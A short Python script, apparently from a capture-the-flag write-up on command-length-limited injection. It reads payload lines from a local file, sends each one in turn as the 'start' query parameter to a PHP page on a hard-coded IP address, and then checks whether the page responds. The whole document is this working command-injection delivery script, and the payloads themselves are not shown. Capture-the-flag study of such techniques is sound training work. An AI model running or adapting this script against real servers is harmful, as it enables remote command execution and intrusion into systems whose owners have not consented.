import requests 

url = "http://13.215.248.36:31717/index.php?start={0}"

with open("D:\Writeups\CHH\Command_Length_Limit_Injection\payload.txt","r") as f:
        for i in f:
                print("[*]" + url.format(i.strip()))
                requests.get(url.format(i.strip())) 

test = requests.get("http://13.215.248.36:31717/index.php")
if test.status_code == requests.codes.ok:
        print("Success!!!")